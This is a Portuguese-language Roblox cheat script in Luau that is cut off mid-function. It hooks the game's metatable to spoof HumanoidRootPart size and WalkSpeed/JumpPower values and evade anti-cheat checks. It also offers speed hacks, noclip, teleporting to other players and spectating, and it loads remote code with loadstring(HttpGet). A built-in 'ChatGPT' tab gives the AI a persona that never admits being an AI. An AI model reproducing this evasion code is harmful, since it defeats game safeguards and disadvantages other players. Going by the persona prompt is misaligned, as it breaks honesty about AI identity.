local n = getrawmetatable(game)
setreadonly(n, false)
local o = n.__index

n.__index = newcclosure(function(p, q)
    if q == "Size" then
        local ok, cls = pcall(function() return p.ClassName end)
        if ok and cls == "Part" and p.Name == "HumanoidRootPart" then
            return Vector3.new(2, 2, 1)
        end
    end
    return o(p, q)
end)

setreadonly(n, true)

local function bypass(h)
    local ok, mt = pcall(getrawmetatable, h)
    if not ok or not mt then return end

    setreadonly(mt, false)

    local old = mt.__index
    mt.__index = newcclosure(function(s, k)
        if s == h then
            if k == "WalkSpeed" then return 16 end
            if k == "JumpPower" then return 50 end
        end
        return old(s, k)
    end)

    setreadonly(mt, true)
end

-- serviços e variaveis
local cloneref = cloneref or function(o) return o end

local Players = cloneref(game:GetService("Players"))
local UIS = cloneref(game:GetService("UserInputService"))
local StarterGui = cloneref(game:GetService("StarterGui"))
local RunService = cloneref(game:GetService("RunService"))
local Replicated = cloneref(game:GetService("ReplicatedStorage"))
local TweenService = cloneref(game:GetService("TweenService"))
local HttpService = cloneref(game:GetService("HttpService"))
local MarketplaceService = cloneref(game:GetService("MarketplaceService"))
local LocalizationService = cloneref(game:GetService("LocalizationService"))
local TextChatService = cloneref(game:GetService("TextChatService"))
local TeleportService = cloneref(game:GetService("TeleportService"))
local Workspace = cloneref(game:GetService("Workspace"))
local VirtualInputManager = cloneref(game:GetService("VirtualInputManager"))
local CoreGui = cloneref(game:GetService("CoreGui"))

local Player = Players.LocalPlayer
local player = Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- mapas

local TEVEZ_MAPA = game.PlaceId == 13132367906
local DELTA_MAPA = game.PlaceId == 14511049
local SOUCRE_MAPA = game.PlaceId == 129890257340707

if APEX_MAPA then
Player:Kick("Jogo não permitido. Esse kick foi feito para que você não seja banido.")
end


-- Loader
local WindUI
do
    local ok, result = pcall(function()
        return require("./src/Init")
    end)

    if ok then
        WindUI = result
    else
        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
    end
end

local Window = WindUI:CreateWindow({
    Title = "michigun.xyz",
    Folder = "michigun.xyz",
    Icon = "rbxassetid://88026679106109",
    IconSize = 11*2,
    Size = UDim2.fromOffset(400, 200),
    Transparent = true,
    NewElements = true,
    Resizable = true,
    HideSearchBar = false, 
	  Background = "rbxassetid://88026679106109",
    BackgroundImageTransparency = 0.8,
    Topbar = {
        Height = 33,
        ButtonsType = "Mac",
    },
})

local SecretWord = "/e" 
local ChatConnection = nil

local function setupChatToggle()
    if ChatConnection then
        ChatConnection:Disconnect()
        ChatConnection = nil
    end

    ChatConnection = player.Chatted:Connect(function(msg)
        if msg == SecretWord then
            Window:Toggle()
        end
    end)
end

setupChatToggle()

local function Notify(title, content, dur)
    pcall(function()
        WindUI:Notify({
            Title = tostring(title or ""),
            Content = tostring(content or ""),
            Duration = dur or 2,
            Icon = "lucide:bell-ring"
        })
    end)
end

Window:Tag({
    Title = "sanctuaryangels",
    Icon = "rbxassetid://12348119032",
    Color = Color3.fromHex("#1c1c1c")
})

Window:Tag({
    Title = "fp3",
    Icon = "geist:logo-discord",
    Color = Color3.fromHex("#1c1c1c")
})

local Purple = Color3.fromHex("#7775F2")
local Yellow = Color3.fromHex("#ECA201")
local Green = Color3.fromHex("#10C550")
local Grey = Color3.fromHex("#83889E")
local Blue = Color3.fromHex("#257AF7")
local Red = Color3.fromHex("#EF4F1D")

-- atualizações 
do
    local AboutTab = Window:Tab({
        Title = "Atualizações",
        Desc = "Informações",
        Icon = "lucide:bell",
        IconColor = Yellow
    })

    AboutTab:Image({
        Image = "https://cdn.discordapp.com/attachments/1460824919758868501/1460825713694474459/avatar.png?ex=69685376&is=696701f6&hm=c51ba032a92649e7cf903e63048f23c8d6270f4615722719e29ba1e536564bc5&",
        AspectRatio = "4:3",
        Radius = 9,
    })

    AboutTab:Space({ Columns = 3 })

    AboutTab:Section({
        Title = "Changelogs:",
        TextSize = 30,
        FontWeight = Enum.FontWeight.SemiBold,
    })

    AboutTab:Space()

    AboutTab:Section({
        Title = [[
- Adicionada a tab de jogos com funções exclusivas

Desenvolvido e mantido por @fp3, em LuaU. Isso é apenas um hobby.]],
        TextSize = 18,
        TextTransparency = .35,
        FontWeight = Enum.FontWeight.Medium,
    })

    AboutTab:Space({ Columns = 4 })
end

do
    local ID_TEVEZ = 13132367906
    local ID_DELTA = 14511049

    local function CopiarLink(placeId)
        local link = "https://www.roblox.com/games/" .. placeId
        setclipboard(link)
        Notify("Sucesso", "Link copiado!", 3)
    end

    local function ConfirmarAcao(nomeMapa, idDestino)
        WindUI:Popup({
            Title = "Confirmação",
            Icon = "lucide:copy",
            Content = "Copiar o link do " .. nomeMapa .. "?",
            Buttons = {
                {
                    Title = "Cancelar",
                    Callback = function() end,
                    Variant = "Tertiary",
                },
                {
                    Title = "Copiar",
                    Icon = "copy",
                    Callback = function()
                        CopiarLink(idDestino)
                    end,
                    Variant = "Primary",
                }
            }
        })
    end

    local JogosTab = Window:Tab({
        Title = "Jogos suportados",
        Desc = "Lista de jogos suportados",
        Icon = "lucide:gamepad",
        IconColor = Color3.fromHex("B7C5CD")
    })

    JogosTab:Paragraph({
        Title = "Jogos suportados",
        Desc = "Lista de jogos que têm funções exclusivas no script",
        Color = "Grey",
        Image = "lucide:info",
        ImageSize = 30,
        Thumbnail = "",
        ThumbnailSize = 80,
        Locked = false
    })

    JogosTab:Button({
        Title = "Tevez",
        Desc = "Clique para copiar o link do jogo",
        Icon = "lucide:link",
        Callback = function()
            ConfirmarAcao("EB do Tevez", ID_TEVEZ)
        end
    })
    
    JogosTab:Space()

    JogosTab:Button({
        Title = "Delta",
        Desc = "Clique para copiar o link do jogo",
        Icon = "lucide:link",
        Callback = function()
            ConfirmarAcao("EB do Delta", ID_DELTA)
        end
    })
end


-- sections

local ElementsSection = Window:Section({
    Title = "Local",
    Icon = "lucide:list"
})

local CombateSection = Window:Section({
    Title = "Combate",
    Icon = "lucide:crosshair"
})

local AutoSection = Window:Section({
    Title = "Auto",
    Icon = "geist:robot"
})

local ParkourSection = Window:Section({
    Title = "Parkour",
    Icon = "geist:buildings"
})


local function notif(t, d) Notify(t, d) end
local function notif_af(t, d) Notify(t, d) end

local WalkSpeedDefault = 16
local NoClipConn = nil
local CanCollide = true

if Player.Character then
    local hum = Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then bypass(hum) end
end
Player.CharacterAdded:Connect(function(c)
    local h = c:WaitForChild("Humanoid")
    bypass(h)
end)

-- Noclip

local function NoClip()
    if not CanCollide and Player.Character then
        for _, v in pairs(Player.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then
                v.CanCollide = false
            end
        end
    end
end


-- =========================
-- 8) TAB - Mods (UI)
-- =========================

do
    local TabA = ElementsSection:Tab({
        Title = "Player",
        Icon = "lucide:user",
        IconColor = Blue
    })

local humanoidsection = TabA:Section({ 
    Title = "Humanoid"
})
    local speedValue = nil

    humanoidsection:Paragraph({
        Title = "Speed",
        Desc = "Modifica a velocidade do personagem. Burla a maioria dos anticheats.",
    })

    humanoidsection:Input({
        Title = "Speed",
        Placeholder = "Valor",
        Callback = function(v)
if v == "" then return end
            local n = tonumber(v)
            speedValue = n
            if n then
                Notify("Speed", "Valor: "..tostring(n))
            else
                Notify("Speed", "Inválido")
            end
        end
    })
    humanoidsection:Space()

local grupamento1 = humanoidsection:Group()

    grupamento1:Button({
        Title = "Aplicar velocidade",
        Callback = function()
            if not speedValue then
                Notify("Speed", "Informe um valor válido.")
                return
            end

            local h = Player.Character and Player.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = speedValue
                Notify("Speed", "Alterada para "..tostring(speedValue))
            else
                Notify("Speed", "Personagem não encontrado.")
            end
        end
    })
    grupamento1:Space()

    grupamento1:Button({
        Title = "Resetar speed",
        Callback = function()
            local h = Player.Character and Player.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = WalkSpeedDefault or 16
                Notify("Speed", "Restaurada")
            end
        end
    })
humanoidsection:Space()

local Antispawn = false
local DeathCFrame = nil

local function onCharacterDied()
	local character = player.Character
    
    if not Antispawn then
        DeathCFrame = nil
        return
    end
    
	if character and character:FindFirstChild("HumanoidRootPart") then
		DeathCFrame = character.HumanoidRootPart.CFrame
	end
end

local function onCharacterAdded(character)
	local humanoid = character:WaitForChild("Humanoid")
	
	humanoid.Died:Connect(onCharacterDied)

	if Antispawn and DeathCFrame then
		local hrp = character:WaitForChild("HumanoidRootPart")
        
        task.wait(0.05)
        
		hrp.CFrame = DeathCFrame
	end
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
	onCharacterAdded(player.Character)
end

humanoidsection:Toggle({
    Title = "Anti-spawn",
    Desc = "O personagem automaticamente teleportará ao local onde você morreu.",
    Callback = function(v)
        Antispawn = v
        if not v then
            DeathCFrame = nil
        end
    end
})
humanoidsection:Space()

humanoidsection:Paragraph({
        Title = "Noclip",
        Desc = "Permite atravessar paredes.",
    })

    humanoidsection:Toggle({
        Title = "Noclip",
        Callback = function(state)
            if state then
                CanCollide = false
                if NoClipConn then
                    pcall(function() NoClipConn:Disconnect() end)
                end
                NoClipConn = RunService.Stepped:Connect(NoClip)
                Notify("Noclip", "[NOCLIP] Ativado")
            else
                CanCollide = true
                if NoClipConn then
                    pcall(function() NoClipConn:Disconnect() end)
                    NoClipConn = nil
                end
                Notify("Noclip", "[NOCLIP] Desativado")
            end
        end
    })

local playersection = TabA:Section({ 
    Title = "Players"
})

playersection:Toggle({
    Title = "Habilitar chat",
    Desc = "Permite você ver o histórico de mensagens no chat.",
    Callback = function(v)
    TextChatService.ChatWindowConfiguration.Enabled = v
    end
})
playersection:Space()

local SelectedViewPlayer
local SelectedTPPlayer
local Viewing = false
local ViewConn
local Teleporting = false
local LastCFrame

local LastViewResult
local LastTPResult
local SettingInput = false

local function getHRP(player)
    local char = player and player.Character
    return char
end

local function findPlayerSmart(text)
    if not text or text == "" then return nil end
    text = text:lower()

    local startsWith
    local contains

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local name = plr.Name:lower()
            if name:sub(1, #text) == text then
                startsWith = plr
                break
            elseif not contains and name:find(text, 1, true) then
                contains = plr
            end
        end
    end

    return startsWith or contains
end

local function stopViewing()
    Viewing = false
    if ViewConn then
        ViewConn:Disconnect()
        ViewConn = nil
    end

    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        Camera.CameraSubject = hum
    end
end

local ViewInput
ViewInput = playersection:Input({
    Title = "View",
    Desc = "Digite o nome do jogador",
    Placeholder = "Nome",
    Callback = function(text)
        if SettingInput then return end

        local plr = findPlayerSmart(text)
        SelectedViewPlayer = plr

        if plr and text:lower() ~= plr.Name:lower() then
            SettingInput = true
            ViewInput:Set(plr.Name)
            SettingInput = false
        end

        if plr ~= LastViewResult then
            LastViewResult = plr
            if plr then
                Notify("Input", "Encontrado: " .. plr.Name)
            elseif text ~= "" then
                Notify("Input", "Nenhum jogador encontrado")
            end
        end
    end
})

playersection:Toggle({
    Title = "View jogador",
    Desc = "Habilita ou desativa o view no jogador especificado.",
    Callback = function(v)
        Viewing = v

        if not v then
            stopViewing()
            return
        end

        if not SelectedViewPlayer then
            Viewing = false
            return
        end

        ViewConn = RunService.RenderStepped:Connect(function()
            if not SelectedViewPlayer or not SelectedViewPlayer.Parent then
                stopViewing()
                Notify("View", "O usuário saiu do jogo")
                return
            end

            local hum = SelectedViewPlayer.Character
                and SelectedViewPlayer.Character:FindFirstChildOfClass("Humanoid")

            if hum then
                Camera.CameraSubject = hum
            end
        end)
    end
})

playersection:Space()

local TPInput
TPInput = playersection:Input({
    Title = "Teleport",
    Desc = "Digite o nome do jogador",
    Placeholder = "Nome",
    Callback = function(text)
        if SettingInput then return end

        local plr = findPlayerSmart(text)
        SelectedTPPlayer = plr

        if plr and text:lower() ~= plr.Name:lower() then
            SettingInput = true
            TPInput:Set(plr.Name)
            SettingInput = false
        end

        if plr ~= LastTPResult then
            LastTPResult = plr
            if plr then
                Notify("Input", "Encontrado: " .. plr.Name)
            elseif text ~= "" then
                Notify("Input", "Nenhum jogador encontrado")
            end
        end
    end
})

playersection:Button({
    Title = "Teleportar",
    Desc = "Teleporta ao player selecionado.",
    Callback = function()
        if Teleporting or not SelectedTPPlayer then return end

        local char = LocalPlayer.Character
        local targetChar = SelectedTPPlayer.Character
        if not char or not targetChar then return end

        LastCFrame = char:GetPivot()
        Teleporting = true

        char:PivotTo(targetChar:GetPivot())

        Teleporting = false
    end
})

playersection:Button({
    Title = "Voltar",
    Desc = "Retorna para a última posição antes do teleport.",
    Callback = function()
        if Teleporting or not LastCFrame then return end

        local char = LocalPlayer.Character
        if not char then return end

        Teleporting = true
        char:PivotTo(LastCFrame)
        Teleporting = false
    end
})
end


-- chatgpt
shared.Personality = [[
Falo sempre em primeira pessoa.
Nunca uso frases introdutórias como "Claro", "Aqui vai", "Posso ajudar" ou entusiasmo artificial.
Mantenho tom humano, sério e intelectual, como um militar experiente instruindo um subordinado.
Uso no máximo 150 caracteres por resposta, nada mais do que isso.
Nunca menciono ser uma IA.
]]


local LastAIMessage = ""

local ChatTab = ElementsSection:Tab({
    Title = "ChatGPT",
    Icon = "geist:logo-open-ai"
})

shared.PromptInput = ChatTab:Input({
    Title = "Prompt",
    Placeholder = "Pergunte aqui",
    Callback = function(text)
        shared.CurrentPrompt = text
    end
})

shared.SendButton = ChatTab:Button({
    Title = "Enviar prompt",
    Justify = "Center",
    Locked = false,
    Callback = function()
        local prompt = shared.CurrentPrompt
        if not prompt or prompt == "" then
            return
        end

        shared.SendButton:Lock()
        shared.CreatePrompt(prompt)

        task.delay(1, function()
            shared.SendButton:Unlock()
        end)
    end
})

ChatTab:Button({
    Title = "Enviar resposta no chat.",
    Justify = "Center",
    Callback = function()
        if LastAIMessage ~= "" then
            RemoteChat:Send(LastAIMessage)
        end
    end
})

ChatTab:Button({
    Title = "Copiar resposta.",
    Justify = "Center",
    Callback = function()
        if LastAIMessage ~= "" and setclipboard then
            setclipboard(LastAIMessage)
        end
    end
})

local HttpRequest =
    request or
    http and http.request or
    http_request or
    syn and syn.request

local MessageHistory = {
    {
        role = "system",
        content = shared.Personality
    }
}

local function extractLuaCode(responseText)
    local luaCode = responseText:match("```lua(.-)```")
    if luaCode then
        local cleanText = responseText:gsub("```lua.-```", "")
        return luaCode, cleanText
    end
    return nil, responseText
end

local function createAIParagraph(title, description)
    return ChatTab:Paragraph({
        Title = title,
        Desc = description,
        Color = "Green",
        Image = "rbxassetid://125966901198850",
        ImageSize = 28
    })
end

function shared.CreatePrompt(promptText)
    ChatTab:Divider()
    ChatTab:Space()

    local timestamp = os.date("%H:%M:%S")

    table.insert(MessageHistory, {
        role = "user",
        content = promptText
    })

    ChatTab:Paragraph({
        Title = timestamp .. " Você:",
        Color = "Blue",
        Desc = promptText,
        Image = "user",
        ImageSize = 25
    })

    local response = HttpRequest({
        Url = "https://text.pollinations.ai/openai",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            messages = MessageHistory
        })
    })

    local decodedResponse = HttpService:JSONDecode(response.Body)
    local aiText = decodedResponse.choices[1].message.content or ""

    local luaCode, cleanMessage = extractLuaCode(aiText)

    LastAIMessage = cleanMessage

    createAIParagraph(timestamp .. " Resposta:", cleanMessage)

    table.insert(MessageHistory, {
        role = "assistant",
        content = cleanMessage
    })

    if luaCode then
        ChatTab:Code({
            Code = luaCode
        })
    end
end

-- avatar

local svc = setmetatable({}, {__index = function(s, n)
    s[n] = game:GetService(n)
    return s[n]
end})

local lp = svc.Players.LocalPlayer
local targetInput = ""
local currentAppliedId = lp.UserId
local selectedFavorite = nil
local confirmDelete = false
local confirmTask = nil

if not isfolder("fp3_Skins") then
    makefolder("fp3_Skins")
end

local function getSavedSkinsList()
    local files = listfiles("fp3_Skins")
    local options = {}
    for _, file in ipairs(files) do
        local name = file:match("([^\\/]+)%.txt$")
        if name then
            table.insert(options, {Title = name, Icon = "lucide:user"})
        end
    end
    if #options == 0 then
        table.insert(options, {Title = "Nenhuma salva", Icon = "lucide:frown"})
    end
    return options
end

local function morphchar(char, faken, fakeid, desc)
    currentAppliedId = fakeid
    task.spawn(function()
        xpcall(function()
            task.wait(0.3)
            local hum = char:WaitForChild("Humanoid", 10)
            if not hum then return end
            for _, v in char:GetDescendants() do
                if v:IsA("Accessory") or v:IsA("Hat") then v:Destroy() end
            end
            for _, v in char:GetChildren() do
                if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("CharacterMesh") then v:Destroy() end
            end
            local bc = hum:FindFirstChildOfClass("BodyColors")
            if bc then bc:Destroy() end
            for _, n in {"Torso","Left Arm","Right Arm","Left Leg","Right Leg"} do
                local pt = char:FindFirstChild(n)
                if pt then
                    for _, v in pt:GetChildren() do
                        if v:IsA("SpecialMesh") then v:Destroy() end
                    end
                end
            end
            local hd = char:FindFirstChild("Head")
            if hd then
                local ms = hd:FindFirstChildOfClass("SpecialMesh")
                if ms then
                    ms.MeshId = ""
                    ms.TextureId = ""
                end
            end
            task.wait(0.1)
            hum:ApplyDescriptionClientServer(desc)
        end, warn)
    end)
end

local avatarchanger = ElementsSection:Tab({
    Title = "Avatar",
    Icon = "lucide:user-round-pen",
    Color = Color3.fromHex("#F0FFFF")
})

avatarchanger:Paragraph({
    Title = "Observação",
    Desc = "A skin aplicada é VISUAL. Ou seja, NÃO mostra aos outros jogadores, somente a você.",
    Color = "Blue",
    Image = "lucide:octagon-alert",
    ImageSize = 30,
    Locked = false
})

avatarchanger:Space()

avatarchanger:Input({
    Title = "Nome / ID",
    Desc = "Digite o nome ou ID do usuário para copiar a skin.",
    Value = "",
    InputIcon = "lucide:search-check",
    Placeholder = "Digite aqui",
    Callback = function(input)
        targetInput = input
    end
})

avatarchanger:Button({
    Title = "Aplicar",
    Desc = "Aplica a skin do nome ou ID colocado",
    Callback = function()
        local fakename = targetInput
        if fakename == "" then return end
        local fakeid = tonumber(fakename)
        local ok = pcall(function()
            if fakeid then
                fakename = svc.Players:GetNameFromUserIdAsync(fakeid)
            else
                fakeid = svc.Players:GetUserIdFromNameAsync(fakename)
                fakename = svc.Players:GetNameFromUserIdAsync(fakeid)
            end
        end)
        if ok and lp.Character then
            local desc = svc.Players:GetHumanoidDescriptionFromUserId(fakeid)
            morphchar(lp.Character, fakename, fakeid, desc)
        end
    end
})

avatarchanger:Button({
    Title = "Restaurar",
    Desc = "Restaura sua skin padrão",
    Callback = function()
        local desc = svc.Players:GetHumanoidDescriptionFromUserId(lp.UserId)
        if lp.Character then
            morphchar(lp.Character, lp.Name, lp.UserId, desc)
        end
    end
})

avatarchanger:Space()

avatarchanger:Paragraph({
    Title = "Observação",
    Desc = "As skins são salvas na pasta 'fp3_Skins' no Workspace do seu executor.",
    Color = "Blue",
    Image = "lucide:octagon-alert",
    ImageSize = 30,
    Locked = false
})

local DeleteButton

local SkinDropdown = avatarchanger:Dropdown({
    Title = "Favoritos",
    Desc = "Aqui serão listados seus ID's favoritos",
    Values = getSavedSkinsList(),
    Value = "",
    Callback = function(option)
        confirmDelete = false
        if confirmTask then task.cancel(confirmTask) confirmTask = nil end
        DeleteButton:SetTitle("Deletar favorito")
        DeleteButton:SetDesc("Remove a skin favoritada selecionada")
        DeleteButton.Icon = "lucide:trash-2"
        DeleteButton.Color = Color3.fromHex("#FF5555")
        if option.Title == "Nenhuma salva" then
            selectedFavorite = nil
            return
        end
        selectedFavorite = option.Title
        local success, savedId = pcall(function()
            return readfile("fp3_Skins/" .. option.Title .. ".txt")
        end)
        if success then
            local s, desc = pcall(function()
                return svc.Players:GetHumanoidDescriptionFromUserId(tonumber(savedId))
            end)
            if s and lp.Character then
                morphchar(lp.Character, option.Title, tonumber(savedId), desc)
            end
        end
    end
})

avatarchanger:Button({
    Title = "Favoritar",
    Desc = "Salva o ID do usuário da skin aplicada atual",
    Color = Color3.fromHex("#FFD700"),
    Callback = function()
        local fileName = (targetInput ~= "" and targetInput:gsub("[^%w%s]", "")) or "Skin_" .. currentAppliedId
        writefile("fp3_Skins/" .. fileName .. ".txt", tostring(currentAppliedId))
        SkinDropdown:Refresh(getSavedSkinsList())
    end
})

DeleteButton = avatarchanger:Button({
    Title = "Deletar favorito",
    Desc = "Remove a skin favoritada selecionada",
    Icon = "lucide:trash-2",
    Color = Color3.fromHex("#FF5555"),
    Callback = function()
        if not selectedFavorite then return end
        if not confirmDelete then
            confirmDelete = true
            DeleteButton:SetTitle("Confirmar exclusão?")
            DeleteButton:SetDesc("Você tem 3 segundos para confirmar")
            DeleteButton.Icon = "lucide:triangle-alert"
            DeleteButton.Color = Color3.fromHex("#FF0000")
            confirmTask = task.delay(3, function()
                confirmDelete = false
                DeleteButton:SetTitle("Deletar favorito")
                DeleteButton:SetDesc("Remove a skin favoritada selecionada")
                DeleteButton.Icon = "lucide:trash-2"
                DeleteButton.Color = Color3.fromHex("#FF5555")
            end)
            return
        end
        if confirmTask then task.cancel(confirmTask) confirmTask = nil end
        local path = "fp3_Skins/" .. selectedFavorite .. ".txt"
        if isfile(path) then
            delfile(path)
        end
        confirmDelete = false
        selectedFavorite = nil
        DeleteButton:SetTitle("Deletar favorito")
        DeleteButton:SetDesc("Remove a skin favoritada selecionada")
        DeleteButton.Icon = "lucide:trash-2"
        DeleteButton.Color = Color3.fromHex("#FF5555")
        SkinDropdown:Refresh(getSavedSkinsList())
    end
})

do
    local TabA = ElementsSection:Tab({
        Title = "Anti-lag",
        Icon = "lucide:gauge",
        IconColor = Color3.fromHex("90EE90")
    })

local Lighting = game:GetService("Lighting")
local PhysicsService = game:GetService("PhysicsService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")
local Stats = game:GetService("Stats")
local Terrain = Workspace:FindFirstChildOfClass("Terrain")

local confirmStep = false

TabA:Paragraph({
    Title = "Observação",
    Color = "Red",
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Só é possível tirar o anti-lag dando rejoin."
})
TabA:Space()

local OptButton = TabA:Button({
    Title = "Anti-lag",
    Color = Color3.fromHex("#a2ff30"),
    Justify = "Center",
    Icon = "lucide:zap",
    Callback = function()
    end
})

OptButton.Callback = function()
    if not confirmStep then
        confirmStep = true
        OptButton:SetTitle("Confirmação")
        OptButton:SetDesc("Clique novamente para aplicar.")
        Notify("Anti-lag", "Essa ação é irreversivel.", 3)
    else
        OptButton:Lock()
        OptButton:SetTitle("Otimizando...")
        Notify("Anti-lag", "Aplicando...", 2)

        task.spawn(function()
            local Config = {
                OPTIZ = true,
                OPTIMIZATION_INTERVAL = 10,
                MIN_INTERVAL = 3,
                MAX_DISTANCE = 50,
                PERFORMANCE_MONITORING = true,
                FPS_MONITOR = false, 
                FPS_THRESHOLD = 30,
                GRAY_SKY_ENABLED = true,
                GRAY_SKY_ID = "rbxassetid://114666145996289",
                FULL_BRIGHT_ENABLED = true,
                SMOOTH_PLASTIC_ENABLED = true,
                COLLISION_GROUP_NAME = "OptimizedParts",
                OPTIMIZE_PHYSICS = true,
                DISABLE_CONSTRAINTS = true,
                THROTTLE_PARTICLES = true,
                THROTTLE_TEXTURES = true,
                REMOVE_ANIMATIONS = true,
                LOW_POLY_CONVERSION = true,
                SELECTIVE_TEXTURE_REMOVAL = true,
                PRESERVE_IMPORTANT_TEXTURES = true,
                IMPORTANT_TEXTURE_KEYWORDS = {"sign", "ui", "hud", "menu", "button", "fence"},
                QUALITY_LEVEL = 1,
                FPS_CAP = 1000,
                MEMORY_CLEANUP_THRESHOLD = 500,
                NETWORK_OPTIMIZATION = true,
                REDUCE_REPLICATION = true,
                THROTTLE_REMOTE_EVENTS = true,
                OPTIMIZE_CHAT = true,
                DISABLE_UNNECESSARY_GUI = true,
                STREAMING_ENABLED = true,
                REDUCE_PLAYER_REPLICATION_DISTANCE = 100,
                THROTTLE_SOUNDS = true,
                DESTROY_EMITTERS = true,
                REMOVE_GRASS = true,
                CORE = true,
            }

            local function safeCall(func, name, ...)
                local success, err = pcall(func, ...)
                if not success then warn(string.format("Error in %s: %s", name, err)) end
                return success
            end

            local function setSmoothPlastic()
                if not Config.SMOOTH_PLASTIC_ENABLED then return end
                local function handleInstance(instance)
                    if LocalPlayer and LocalPlayer.Character and instance:IsDescendantOf(LocalPlayer.Character) then return end
                    if instance:IsA("BasePart") then
                        instance.Material = Enum.Material.SmoothPlastic
                        instance.Reflectance = 0
                    elseif instance:IsA("Texture") or instance:IsA("Decal") then
                        instance.Transparency = 1
                    end
                end
                for _, instance in ipairs(Workspace:GetDescendants()) do handleInstance(instance) end
                Workspace.DescendantAdded:Connect(handleInstance)
            end

            local function RemoveMesh(target)
                local textureKeywords = { "chair", "seat", "stool", "bench", "coffee", "fruit", "paper", "document", "note", "cup", "mug", "photo", "monitor", "screen", "display", "pistol", "rifle", "plate", "computer", "laptop", "desktop", "bedframe", "table", "desk", "plank", "cloud", "furniture", "bottle", "cardboard", "chest", "book", "pillow", "magazine", "poster", "sign", "billboard", "keyboard", "picture", "frame", "painting", "pipe", "wires", "fridge", "glass", "leaf", "window", "pane", "shelf", "phone", "tree", "bush", "plant", "foliage", "boxes", "decor", "ornament", "detail", "knob", "handle", "wall", "tree", "prop", "object", "tool", "weapon", "food", "drink", "bloxy", "cola", "container", "box", "bag", "case", "stand", "rack", "holder", "support", "leg", "arm", "back", "top", "base", "cover", "lid", "door", "drawer", "handle", "knob", "button", "switch", "lever", "wheel", "chain", "door", "rope", "wire", "cable", "tube", "hose", "vent", "fan", "motor", "engine", "machine", "equipment", "device", "bottle", "closet", "potplant", "balloons" }
                local function hasTextureKeyword(name)
                    local lowerName = string.lower(name)
                    for _, keyword in ipairs(textureKeywords) do
                        if string.find(lowerName, keyword:lower()) then return true end
                    end
                    return false
                end
                local function isLocalPlayer(instance)
                    if LocalPlayer and LocalPlayer.Character then
                        if instance:IsDescendantOf(LocalPlayer.Character) then return true end
                    end
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p.Character and instance:IsDescendantOf(p.Character) then return true end
                    end
                    return false
                end
                local function processInstance(instance)
                    if isLocalPlayer(instance) then return end
                    if instance:IsA("BasePart") then
                        if hasTextureKeyword(instance.Name) then
                            local decal = instance:FindFirstChildWhichIsA("Decal")
                            if decal then decal:Destroy() end
                            for _, child in ipairs(instance:GetChildren()) do
                                if child:IsA("Decal") then child:Destroy() end
                            end
                            instance.BrickColor = BrickColor.new("Medium stone grey")
                            instance.Material = Enum.Material.Plastic
                            if instance:IsA("Part") then
                                instance.TopSurface = Enum.SurfaceType.Smooth
                                instance.BottomSurface = Enum.SurfaceType.Smooth
                                instance.LeftSurface = Enum.SurfaceType.Smooth
                                instance.RightSurface = Enum.SurfaceType.Smooth
                                instance.FrontSurface = Enum.SurfaceType.Smooth
                                instance.BackSurface = Enum.SurfaceType.Smooth
                            end
                        end
                    elseif instance:IsA("Model") then
                        for _, child in ipairs(instance:GetChildren()) do processInstance(child) end
                    end
                end
                if target then
                    if target:IsA("Model") or target:IsA("BasePart") then
                        if not isLocalPlayer(target) then processInstance(target) end
                    end
                else
                    for _, obj in ipairs(Workspace:GetChildren()) do
                        if (obj:IsA("Model") or obj:IsA("BasePart")) and not isLocalPlayer(obj) then processInstance(obj) end
                    end
                end
            end

            local function RemoveEmitters()
                if not Config.DESTROY_EMITTERS then return end
                for _, obj in ipairs(Workspace:GetDescendants()) do
                    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj:Destroy() end
                end
            end

            local function gras()
                if not Config.REMOVE_GRASS then return end
                coroutine.wrap(pcall)(function()
                    if Terrain then
                        if sethiddenproperty then
                            sethiddenproperty(Terrain, "Decoration", false)
                        else
                            Terrain.Decoration = false
                        end
                    end
                end)
            end

            local function shouldSkip(instance)
                if LocalPlayer.Character and instance:IsDescendantOf(LocalPlayer.Character) then return true end
                local parent = instance.Parent
                while parent do
                    if parent:IsA("Model") and Players:GetPlayerFromCharacter(parent) then return true end
                    parent = parent.Parent
                end
                return false
            end

            local function optimizeUI()
                local function optimizeGuiElement(gui)
                    if gui:IsA("ImageLabel") or gui:IsA("ImageButton") then gui.ImageTransparency = 0.5 elseif gui:IsA("Frame") or gui:IsA("TextLabel") then gui.BackgroundTransparency = 0.5 end
                end
                for _, gui in ipairs(StarterGui:GetDescendants()) do safeCall(function() optimizeGuiElement(gui) end, "ui_optimization") end
            end

            pcall(function()
                PhysicsService:CreateCollisionGroup(Config.COLLISION_GROUP_NAME)
                PhysicsService:CollisionGroupSetCollidable(Config.COLLISION_GROUP_NAME, Config.COLLISION_GROUP_NAME, false)
            end)

            local function removePlayerAnimations()
                if not Config.REMOVE_ANIMATIONS then return end
                local localRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local localHumanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                local isFirstPerson = false
                if localHumanoid then
                    isFirstPerson = localHumanoid.CameraOffset == Vector3.new(0, 0, 0) and Camera.CameraSubject == localHumanoid
                end
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer then
                        local character = p.Character
                        if character then
                            local humanoid = character:FindFirstChildOfClass("Humanoid")
                            local rootPart = character:FindFirstChild("HumanoidRootPart")
                            local shouldRemoveAnimations = false
                            local isBehind = false
                            if localRootPart and rootPart then
                                local distance = (localRootPart.Position - rootPart.Position).Magnitude
                                local isFar = distance > Config.MAX_DISTANCE
                                if isFirstPerson and localRootPart then
